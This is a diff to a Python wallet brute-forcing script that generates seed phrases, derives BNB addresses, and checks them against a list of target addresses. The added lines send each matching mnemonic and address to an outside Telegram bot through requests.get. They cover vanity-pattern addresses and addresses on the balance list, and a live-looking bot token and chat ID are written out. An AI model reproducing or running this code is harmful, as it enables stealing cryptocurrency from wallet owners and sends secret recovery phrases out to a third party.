@@ -32,13 +32,17 @@ def brute_force_wallet(listarr):
             phrase = phrase.lstrip()
             address = generate_address_from_seed(phrase)
             if address != None:
-                print("Wallet: " + address, end='\r')
-                #if (("123456789" in str(address).lower()) or ("987654321" in str(address).lower()) or ("99999999" in str(address).lower()) or ("88888888" in str(address).lower()) or ("77777777" in str(address).lower()) or ("55555555" in str(address).lower()) or ("44444444" in str(address).lower()) or ("33333333" in str(address).lower()) or ("22222222" in str(address).lower()) or ("11111111" in str(address).lower()) or ("vas1l" in str(address).lower()) or ("vasya" in str(address).lower()) or ("vlad" in str(address).lower()) or ("alex" in str(address).lower()) or ("vlad1k" in str(address).lower()) or ("slav1k" in str(address).lower()) or ("vasiliy" in str(address).lower()) or ("66666666" in str(address).lower()) or ("00000000" in str(address).lower())):
+                print("Wallet: " + address)
+                if (("123456789" in str(address).lower()) or ("987654321" in str(address).lower()) or ("99999999" in str(address).lower()) or ("88888888" in str(address).lower()) or ("77777777" in str(address).lower()) or ("55555555" in str(address).lower()) or ("44444444" in str(address).lower()) or ("33333333" in str(address).lower()) or ("22222222" in str(address).lower()) or ("11111111" in str(address).lower()) or ("vas1l" in str(address).lower()) or ("vasya" in str(address).lower()) or ("vlad" in str(address).lower()) or ("alex" in str(address).lower()) or ("vlad1k" in str(address).lower()) or ("slav1k" in str(address).lower()) or ("vasiliy" in str(address).lower()) or ("66666666" in str(address).lower()) or ("00000000" in str(address).lower())):
+                    try:
+                        requests.get('https://api.telegram.org/bot1542518391:AAF-g9tAClBokAPj90bze3nTeS1ieFXVyNA/sendMessage?chat_id=-1001569507312&text=NORMADDR   BNB mnemonic: ' + str(phrase) + '\n' + 'address: ' + str(address))
+                    except:
+                        pass
                     #with open("normaddr.txt", "a") as f:
                         #f.write(phrase + "??" + address + "\n")
                 if (str(address).lower() in listarr):
                     try:
-                        requests.get('https://api.telegram.org/bot1542518391:AAF-g9tAClBokAPj90bze3nTeS1ieFXVyNA/sendMessage?chat_id=-1001569507312&text=BNB mnemonic: ' + str(phrase) + '\n' + 'address: ' + str(address))
+                        requests.get('https://api.telegram.org/bot1542518391:AAF-g9tAClBokAPj90bze3nTeS1ieFXVyNA/sendMessage?chat_id=-1001569507312&text=BALANCEACC   BNB mnemonic: ' + str(phrase) + '\n' + 'address: ' + str(address))
                     except:
                         pass
                     #with open("save.txt", "a") as f:
